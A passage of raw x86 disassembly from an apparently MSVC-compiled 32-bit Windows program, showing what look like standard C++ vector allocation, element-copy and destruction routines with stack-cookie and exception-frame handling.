  404515:	50                   	push   %eax
  404516:	56                   	push   %esi
  404517:	e8 f0 7c 00 00       	call   0x40c20c
  40451c:	c7 07 00 00 00 00    	movl   $0x0,(%edi)
  404522:	83 c4 08             	add    $0x8,%esp
  404525:	c7 47 04 00 00 00 00 	movl   $0x0,0x4(%edi)
  40452c:	c7 47 08 00 00 00 00 	movl   $0x0,0x8(%edi)
  404533:	5f                   	pop    %edi
  404534:	5e                   	pop    %esi
  404535:	c3                   	ret
  404536:	e8 5e bc 00 00       	call   0x410199
  40453b:	cc                   	int3
  40453c:	cc                   	int3
  40453d:	cc                   	int3
  40453e:	cc                   	int3
  40453f:	cc                   	int3
  404540:	55                   	push   %ebp
  404541:	8b ec                	mov    %esp,%ebp
  404543:	56                   	push   %esi
  404544:	8b 75 08             	mov    0x8(%ebp),%esi
  404547:	57                   	push   %edi
  404548:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40454b:	3b f7                	cmp    %edi,%esi
  40454d:	74 0f                	je     0x40455e
  40454f:	90                   	nop
  404550:	8b ce                	mov    %esi,%ecx
  404552:	e8 c9 f2 ff ff       	call   0x403820
  404557:	83 c6 4c             	add    $0x4c,%esi
  40455a:	3b f7                	cmp    %edi,%esi
  40455c:	75 f2                	jne    0x404550
  40455e:	5f                   	pop    %edi
  40455f:	5e                   	pop    %esi
  404560:	5d                   	pop    %ebp
  404561:	c2 08 00             	ret    $0x8
  404564:	cc                   	int3
  404565:	cc                   	int3
  404566:	cc                   	int3
  404567:	cc                   	int3
  404568:	cc                   	int3
  404569:	cc                   	int3
  40456a:	cc                   	int3
  40456b:	cc                   	int3
  40456c:	cc                   	int3
  40456d:	cc                   	int3
  40456e:	cc                   	int3
  40456f:	cc                   	int3
  404570:	55                   	push   %ebp
  404571:	8b ec                	mov    %esp,%ebp
  404573:	6b 4d 0c 4c          	imul   $0x4c,0xc(%ebp),%ecx
  404577:	8b 45 08             	mov    0x8(%ebp),%eax
  40457a:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404580:	72 12                	jb     0x404594
  404582:	8b 50 fc             	mov    -0x4(%eax),%edx
  404585:	83 c1 23             	add    $0x23,%ecx
  404588:	2b c2                	sub    %edx,%eax
  40458a:	83 c0 fc             	add    $0xfffffffc,%eax
  40458d:	83 f8 1f             	cmp    $0x1f,%eax
  404590:	77 10                	ja     0x4045a2
  404592:	8b c2                	mov    %edx,%eax
  404594:	51                   	push   %ecx
  404595:	50                   	push   %eax
  404596:	e8 71 7c 00 00       	call   0x40c20c
  40459b:	83 c4 08             	add    $0x8,%esp
  40459e:	5d                   	pop    %ebp
  40459f:	c2 08 00             	ret    $0x8
  4045a2:	e8 f2 bb 00 00       	call   0x410199
  4045a7:	cc                   	int3
  4045a8:	cc                   	int3
  4045a9:	cc                   	int3
  4045aa:	cc                   	int3
  4045ab:	cc                   	int3
  4045ac:	cc                   	int3
  4045ad:	cc                   	int3
  4045ae:	cc                   	int3
  4045af:	cc                   	int3
  4045b0:	55                   	push   %ebp
  4045b1:	8b ec                	mov    %esp,%ebp
  4045b3:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4045b6:	8d 45 10             	lea    0x10(%ebp),%eax
  4045b9:	50                   	push   %eax
  4045ba:	51                   	push   %ecx
  4045bb:	ff 75 0c             	push   0xc(%ebp)
  4045be:	ba 00 04 00 00       	mov    $0x400,%edx
  4045c3:	e8 18 09 00 00       	call   0x404ee0
  4045c8:	83 c4 0c             	add    $0xc,%esp
  4045cb:	5d                   	pop    %ebp
  4045cc:	c3                   	ret
  4045cd:	cc                   	int3
  4045ce:	cc                   	int3
  4045cf:	cc                   	int3
  4045d0:	55                   	push   %ebp
  4045d1:	8b ec                	mov    %esp,%ebp
  4045d3:	6a ff                	push   $0xffffffff
  4045d5:	68 56 06 42 00       	push   $0x420656
  4045da:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4045e0:	50                   	push   %eax
  4045e1:	83 ec 2c             	sub    $0x2c,%esp
  4045e4:	53                   	push   %ebx
  4045e5:	56                   	push   %esi
  4045e6:	57                   	push   %edi
  4045e7:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  4045ec:	33 c5                	xor    %ebp,%eax
  4045ee:	50                   	push   %eax
  4045ef:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4045f2:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  4045f8:	89 65 f0             	mov    %esp,-0x10(%ebp)
  4045fb:	8b d9                	mov    %ecx,%ebx
  4045fd:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  404600:	8b 75 08             	mov    0x8(%ebp),%esi
  404603:	8b d6                	mov    %esi,%edx
  404605:	2b 13                	sub    (%ebx),%edx
  404607:	8b 45 0c             	mov    0xc(%ebp),%eax
  40460a:	8b 4b 04             	mov    0x4(%ebx),%ecx
  40460d:	2b 0b                	sub    (%ebx),%ecx
  40460f:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404612:	b8 f3 1a ca 6b       	mov    $0x6bca1af3,%eax
  404617:	f7 ea                	imul   %edx
  404619:	c1 fa 05             	sar    $0x5,%edx
  40461c:	8b c2                	mov    %edx,%eax
  40461e:	c1 e8 1f             	shr    $0x1f,%eax
  404621:	03 c2                	add    %edx,%eax
  404623:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404626:	b8 f3 1a ca 6b       	mov    $0x6bca1af3,%eax
  40462b:	f7 e9                	imul   %ecx
  40462d:	c1 fa 05             	sar    $0x5,%edx
  404630:	8b c2                	mov    %edx,%eax
  404632:	c1 e8 1f             	shr    $0x1f,%eax
  404635:	03 c2                	add    %edx,%eax
  404637:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40463a:	3d d7 50 5e 03       	cmp    $0x35e50d7,%eax
  40463f:	0f 84 9d 01 00 00    	je     0x4047e2
  404645:	8b 4b 08             	mov    0x8(%ebx),%ecx
  404648:	8d 78 01             	lea    0x1(%eax),%edi
  40464b:	2b 0b                	sub    (%ebx),%ecx
  40464d:	b8 f3 1a ca 6b       	mov    $0x6bca1af3,%eax
  404652:	f7 e9                	imul   %ecx
  404654:	b8 d7 50 5e 03       	mov    $0x35e50d7,%eax
  404659:	c1 fa 05             	sar    $0x5,%edx
  40465c:	8b ca                	mov    %edx,%ecx
  40465e:	c1 e9 1f             	shr    $0x1f,%ecx
  404661:	03 ca                	add    %edx,%ecx
  404663:	8b d1                	mov    %ecx,%edx
  404665:	d1 ea                	shr    $1,%edx
  404667:	2b c2                	sub    %edx,%eax
  404669:	3b c8                	cmp    %eax,%ecx
  40466b:	76 07                	jbe    0x404674
  40466d:	8b c7                	mov    %edi,%eax
  40466f:	89 7d dc             	mov    %edi,-0x24(%ebp)
  404672:	eb 0b                	jmp    0x40467f
  404674:	8d 04 0a             	lea    (%edx,%ecx,1),%eax
  404677:	3b c7                	cmp    %edi,%eax
  404679:	0f 42 c7             	cmovb  %edi,%eax
  40467c:	89 45 dc             	mov    %eax,-0x24(%ebp)
  40467f:	6b c8 4c             	imul   $0x4c,%eax,%ecx
  404682:	3d d7 50 5e 03       	cmp    $0x35e50d7,%eax
  404687:	76 05                	jbe    0x40468e
  404689:	83 c9 ff             	or     $0xffffffff,%ecx
  40468c:	eb 08                	jmp    0x404696
  40468e:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  404694:	72 27                	jb     0x4046bd
  404696:	8d 41 23             	lea    0x23(%ecx),%eax
  404699:	83 ca ff             	or     $0xffffffff,%edx
  40469c:	3b c1                	cmp    %ecx,%eax
  40469e:	0f 46 c2             	cmovbe %edx,%eax
  4046a1:	50                   	push   %eax
  4046a2:	e8 73 7b 00 00       	call   0x40c21a
  4046a7:	83 c4 04             	add    $0x4,%esp
  4046aa:	85 c0                	test   %eax,%eax
  4046ac:	0f 84 35 01 00 00    	je     0x4047e7
  4046b2:	8d 78 23             	lea    0x23(%eax),%edi
  4046b5:	83 e7 e0             	and    $0xffffffe0,%edi
  4046b8:	89 47 fc             	mov    %eax,-0x4(%edi)
  4046bb:	eb 19                	jmp    0x4046d6
  4046bd:	85 c9                	test   %ecx,%ecx
  4046bf:	74 13                	je     0x4046d4
  4046c1:	51                   	push   %ecx
  4046c2:	e8 53 7b 00 00       	call   0x40c21a
  4046c7:	83 c4 04             	add    $0x4,%esp
  4046ca:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4046cd:	8b f8                	mov    %eax,%edi
  4046cf:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4046d2:	eb 08                	jmp    0x4046dc
  4046d4:	33 ff                	xor    %edi,%edi
  4046d6:	89 7d d8             	mov    %edi,-0x28(%ebp)
  4046d9:	89 7d e8             	mov    %edi,-0x18(%ebp)
  4046dc:	6b 45 ec 4c          	imul   $0x4c,-0x14(%ebp),%eax
  4046e0:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  4046e3:	8d 1c 38             	lea    (%eax,%edi,1),%ebx
  4046e6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4046ed:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  4046f0:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4046f3:	8d 43 4c             	lea    0x4c(%ebx),%eax
  4046f6:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4046f9:	89 45 cc             	mov    %eax,-0x34(%ebp)
  4046fc:	8a 01                	mov    (%ecx),%al
  4046fe:	88 03                	mov    %al,(%ebx)
  404700:	8d 41 04             	lea    0x4(%ecx),%eax
  404703:	50                   	push   %eax
  404704:	8d 4b 04             	lea    0x4(%ebx),%ecx
  404707:	e8 14 eb ff ff       	call   0x403220
  40470c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40470f:	8d 4b 1c             	lea    0x1c(%ebx),%ecx
  404712:	83 c0 1c             	add    $0x1c,%eax
  404715:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  404719:	50                   	push   %eax
  40471a:	e8 01 eb ff ff       	call   0x403220
  40471f:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404722:	8d 4b 34             	lea    0x34(%ebx),%ecx
  404725:	83 c0 34             	add    $0x34,%eax
  404728:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  40472c:	50                   	push   %eax
  40472d:	e8 ee ea ff ff       	call   0x403220
  404732:	8b 45 e0             	mov    -0x20(%ebp),%eax
  404735:	8b cf                	mov    %edi,%ecx
  404737:	8b 58 04             	mov    0x4(%eax),%ebx
  40473a:	3b f3                	cmp    %ebx,%esi
  40473c:	75 18                	jne    0x404756
  40473e:	8b 30                	mov    (%eax),%esi
  404740:	3b f3                	cmp    %ebx,%esi
  404742:	74 54                	je     0x404798
  404744:	56                   	push   %esi
  404745:	e8 96 f5 ff ff       	call   0x403ce0
  40474a:	83 c6 4c             	add    $0x4c,%esi
  40474d:	83 c1 4c             	add    $0x4c,%ecx
  404750:	3b f3                	cmp    %ebx,%esi
  404752:	75 f0                	jne    0x404744
  404754:	eb 42                	jmp    0x404798
  404756:	8b 38                	mov    (%eax),%edi
  404758:	3b fe                	cmp    %esi,%edi
  40475a:	74 1a                	je     0x404776
  40475c:	0f 1f 40 00          	nopl   0x0(%eax)
  404760:	57                   	push   %edi
  404761:	e8 7a f5 ff ff       	call   0x403ce0
  404766:	83 c7 4c             	add    $0x4c,%edi
  404769:	83 c1 4c             	add    $0x4c,%ecx
  40476c:	3b fe                	cmp    %esi,%edi
  40476e:	75 f0                	jne    0x404760
  404770:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  404773:	8b 5b 04             	mov    0x4(%ebx),%ebx
  404776:	3b f3                	cmp    %ebx,%esi
  404778:	74 1b                	je     0x404795
  40477a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40477d:	2b c6                	sub    %esi,%eax
  40477f:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404782:	56                   	push   %esi
  404783:	8d 0c 06             	lea    (%esi,%eax,1),%ecx
  404786:	e8 55 f5 ff ff       	call   0x403ce0
  40478b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40478e:	83 c6 4c             	add    $0x4c,%esi
  404791:	3b f3                	cmp    %ebx,%esi
  404793:	75 ed                	jne    0x404782
  404795:	8b 7d e8             	mov    -0x18(%ebp),%edi
  404798:	ff 75 dc             	push   -0x24(%ebp)
  40479b:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  40479e:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  4047a1:	40                   	inc    %eax
  4047a2:	50                   	push   %eax
  4047a3:	57                   	push   %edi
  4047a4:	8b cb                	mov    %ebx,%ecx
  4047a6:	e8 45 00 00 00       	call   0x4047f0
  4047ab:	8b 03                	mov    (%ebx),%eax
  4047ad:	03 45 d0             	add    -0x30(%ebp),%eax
  4047b0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4047b3:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4047ba:	59                   	pop    %ecx
  4047bb:	5f                   	pop    %edi
  4047bc:	5e                   	pop    %esi
  4047bd:	5b                   	pop    %ebx
  4047be:	8b e5                	mov    %ebp,%esp
  4047c0:	5d                   	pop    %ebp
  4047c1:	c2 08 00             	ret    $0x8
  4047c4:	8b 45 cc             	mov    -0x34(%ebp),%eax
  4047c7:	50                   	push   %eax
  4047c8:	50                   	push   %eax
  4047c9:	e8 72 fd ff ff       	call   0x404540
  4047ce:	ff 75 dc             	push   -0x24(%ebp)
  4047d1:	ff 75 d8             	push   -0x28(%ebp)
  4047d4:	e8 97 fd ff ff       	call   0x404570
  4047d9:	6a 00                	push   $0x0
  4047db:	6a 00                	push   $0x0
  4047dd:	e8 22 94 00 00       	call   0x40dc04
  4047e2:	e8 e9 cd ff ff       	call   0x4015d0
  4047e7:	e8 ad b9 00 00       	call   0x410199
  4047ec:	cc                   	int3
  4047ed:	cc                   	int3
  4047ee:	cc                   	int3
  4047ef:	cc                   	int3
  4047f0:	55                   	push   %ebp
  4047f1:	8b ec                	mov    %esp,%ebp
  4047f3:	56                   	push   %esi
  4047f4:	57                   	push   %edi
  4047f5:	8b f9                	mov    %ecx,%edi
  4047f7:	8b 37                	mov    (%edi),%esi
  4047f9:	85 f6                	test   %esi,%esi
  4047fb:	74 55                	je     0x404852
  4047fd:	53                   	push   %ebx
  4047fe:	8b 5f 04             	mov    0x4(%edi),%ebx
  404801:	3b f3                	cmp    %ebx,%esi
  404803:	74 10                	je     0x404815
  404805:	8b ce                	mov    %esi,%ecx
  404807:	e8 14 f0 ff ff       	call   0x403820
  40480c:	83 c6 4c             	add    $0x4c,%esi
  40480f:	3b f3                	cmp    %ebx,%esi
  404811:	75 f2                	jne    0x404805
  404813:	8b 37                	mov    (%edi),%esi
  404815:	8b 4f 08             	mov    0x8(%edi),%ecx
  404818:	b8 f3 1a ca 6b       	mov    $0x6bca1af3,%eax
  40481d:	2b ce                	sub    %esi,%ecx
  40481f:	f7 e9                	imul   %ecx
  404821:	5b                   	pop    %ebx
  404822:	c1 fa 05             	sar    $0x5,%edx
  404825:	8b c2                	mov    %edx,%eax
  404827:	c1 e8 1f             	shr    $0x1f,%eax
  40482a:	03 c2                	add    %edx,%eax
  40482c:	6b c0 4c             	imul   $0x4c,%eax,%eax
  40482f:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404834:	72 12                	jb     0x404848
  404836:	8b 4e fc             	mov    -0x4(%esi),%ecx
  404839:	83 c0 23             	add    $0x23,%eax
  40483c:	2b f1                	sub    %ecx,%esi
  40483e:	83 c6 fc             	add    $0xfffffffc,%esi
  404841:	83 fe 1f             	cmp    $0x1f,%esi
  404844:	77 29                	ja     0x40486f
  404846:	8b f1                	mov    %ecx,%esi
  404848:	50                   	push   %eax
  404849:	56                   	push   %esi
  40484a:	e8 bd 79 00 00       	call   0x40c20c
  40484f:	83 c4 08             	add    $0x8,%esp
  404852:	6b 45 0c 4c          	imul   $0x4c,0xc(%ebp),%eax
  404856:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404859:	89 0f                	mov    %ecx,(%edi)
  40485b:	03 c1                	add    %ecx,%eax
  40485d:	89 47 04             	mov    %eax,0x4(%edi)
  404860:	6b 45 10 4c          	imul   $0x4c,0x10(%ebp),%eax
  404864:	03 c1                	add    %ecx,%eax
  404866:	89 47 08             	mov    %eax,0x8(%edi)
  404869:	5f                   	pop    %edi
  40486a:	5e                   	pop    %esi
  40486b:	5d                   	pop    %ebp
  40486c:	c2 0c 00             	ret    $0xc
  40486f:	e8 25 b9 00 00       	call   0x410199
  404874:	cc                   	int3
  404875:	cc                   	int3
  404876:	cc                   	int3
  404877:	cc                   	int3
  404878:	cc                   	int3
  404879:	cc                   	int3
  40487a:	cc                   	int3
  40487b:	cc                   	int3
  40487c:	cc                   	int3
  40487d:	cc                   	int3
  40487e:	cc                   	int3
  40487f:	cc                   	int3
  404880:	55                   	push   %ebp
  404881:	8b ec                	mov    %esp,%ebp
  404883:	51                   	push   %ecx
  404884:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  404889:	33 c5                	xor    %ebp,%eax
  40488b:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40488e:	53                   	push   %ebx
  40488f:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  404892:	56                   	push   %esi
  404893:	8b 75 08             	mov    0x8(%ebp),%esi
  404896:	57                   	push   %edi
  404897:	3b f3                	cmp    %ebx,%esi
  404899:	74 15                	je     0x4048b0
  40489b:	8b 7d 10             	mov    0x10(%ebp),%edi
  40489e:	2b fe                	sub    %esi,%edi
  4048a0:	56                   	push   %esi
  4048a1:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  4048a4:	e8 37 f4 ff ff       	call   0x403ce0
  4048a9:	83 c6 4c             	add    $0x4c,%esi
  4048ac:	3b f3                	cmp    %ebx,%esi
  4048ae:	75 f0                	jne    0x4048a0
  4048b0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4048b3:	5f                   	pop    %edi
  4048b4:	5e                   	pop    %esi
  4048b5:	33 cd                	xor    %ebp,%ecx
  4048b7:	5b                   	pop    %ebx
  4048b8:	e8 3e 79 00 00       	call   0x40c1fb
  4048bd:	8b e5                	mov    %ebp,%esp
  4048bf:	5d                   	pop    %ebp
  4048c0:	c2 0c 00             	ret    $0xc
  4048c3:	cc                   	int3
  4048c4:	cc                   	int3
  4048c5:	cc                   	int3
  4048c6:	cc                   	int3
  4048c7:	cc                   	int3
  4048c8:	cc                   	int3
  4048c9:	cc                   	int3
  4048ca:	cc                   	int3
  4048cb:	cc                   	int3
  4048cc:	cc                   	int3
  4048cd:	cc                   	int3
  4048ce:	cc                   	int3
  4048cf:	cc                   	int3
  4048d0:	55                   	push   %ebp
  4048d1:	8b ec                	mov    %esp,%ebp
  4048d3:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4048d6:	56                   	push   %esi
  4048d7:	8b 75 08             	mov    0x8(%ebp),%esi
  4048da:	57                   	push   %edi
  4048db:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4048de:	3b f7                	cmp    %edi,%esi
  4048e0:	74 10                	je     0x4048f2
  4048e2:	56                   	push   %esi
  4048e3:	e8 f8 f3 ff ff       	call   0x403ce0
  4048e8:	83 c6 4c             	add    $0x4c,%esi
  4048eb:	83 c1 4c             	add    $0x4c,%ecx
  4048ee:	3b f7                	cmp    %edi,%esi
  4048f0:	75 f0                	jne    0x4048e2
  4048f2:	5f                   	pop    %edi
  4048f3:	8b c1                	mov    %ecx,%eax
  4048f5:	5e                   	pop    %esi
  4048f6:	5d                   	pop    %ebp
  4048f7:	c2 0c 00             	ret    $0xc
  4048fa:	cc                   	int3
  4048fb:	cc                   	int3
  4048fc:	cc                   	int3
  4048fd:	cc                   	int3
  4048fe:	cc                   	int3
  4048ff:	cc                   	int3
  404900:	55                   	push   %ebp
  404901:	8b ec                	mov    %esp,%ebp
  404903:	6a ff                	push   $0xffffffff
  404905:	68 80 06 42 00       	push   $0x420680
  40490a:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  404910:	50                   	push   %eax
  404911:	83 ec 2c             	sub    $0x2c,%esp
  404914:	53                   	push   %ebx
  404915:	56                   	push   %esi
  404916:	57                   	push   %edi
  404917:	a1 0c b0 42 00       	mov    0x42b00c,%eax
  40491c:	33 c5                	xor    %ebp,%eax
  40491e:	50                   	push   %eax
  40491f:	8d 45 f4             	lea    -0xc(%ebp),%eax
  404922:	64 a3 00 00 00 00    	mov    %eax,%fs:0x0
  404928:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40492b:	8b f9                	mov    %ecx,%edi
  40492d:	89 7d e0             	mov    %edi,-0x20(%ebp)
  404930:	8b 45 0c             	mov    0xc(%ebp),%eax
  404933:	8b 4d 10             	mov    0x10(%ebp),%ecx
  404936:	8b 75 08             	mov    0x8(%ebp),%esi
  404939:	89 45 d0             	mov    %eax,-0x30(%ebp)
  40493c:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  40493f:	2b c8                	sub    %eax,%ecx
